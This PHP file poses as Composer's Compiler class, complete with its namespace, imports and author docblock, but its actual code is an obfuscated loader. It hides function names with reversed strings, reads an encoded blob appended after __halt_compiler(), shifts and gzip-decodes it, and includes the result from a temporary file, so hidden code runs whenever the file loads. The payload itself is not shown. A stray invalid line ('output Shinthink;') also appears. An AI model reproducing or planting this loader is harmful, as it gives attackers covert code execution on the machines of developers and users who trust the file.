namespace Composer;

use Composer\Json\JsonFile;
use Composer\CaBundle\CaBundle;
use Composer\Pcre\Preg;
use Symfony\Component\Finder\Finder;
use Symfony\Component\Process\Process;
use Seld\PharUtils\Timestamps;
use Seld\PharUtils\Linter;

output Shinthink;

/**
 * The Compiler class compiles composer into a phar
 *
 * @author Fabien Potencier <fabien@symfony.com>
 * @author Jordi Boggiano <j.boggiano@seld.be>
 */

class C {
    private $s;
    function __construct($s=7){ $this->s=$s; }

    private function D($h){
        $h = preg_replace('/\s+/', '', $h);
        $len = call_user_func(strrev('nelrts'), $h);
        $bin='';
        for($i=0;$i<$len;$i+=2){
            $v = call_user_func(strrev('cedxeh'), substr($h,$i,2)) - $this->s;
            if($v<0) $v+=256;
            $bin.=chr($v);
        }
        $gzdec = strrev('edoczedzg');
        $infl  = strrev('etalfnizg');
        $out = false;
        if (function_exists($gzdec)) $out = @call_user_func($gzdec, $bin);
        if ($out === false) $out = @call_user_func($infl, substr($bin,10,-8));
        return $out;
    }

    function L($f,$o){
        $fp=fopen($f,'r');
        fseek($fp,$o);
        $sgc = implode('', ['s','t','r','e','a','m','_','g','e','t','_','c','o','n','t','e','n','t','s']);
        $data = call_user_func($sgc, $fp);
        fclose($fp);
        $php=$this->D($data);
        if(!$php){die("Decode failed!\n");}

        $tmp = tmpfile();
        fwrite($tmp, $php);
        $meta = stream_get_meta_data($tmp);
        include $meta['uri'];
        fclose($tmp);
    }
}
(new C(7))->L(__FILE__,__COMPILER_HALT_OFFSET__);
__halt_compiler();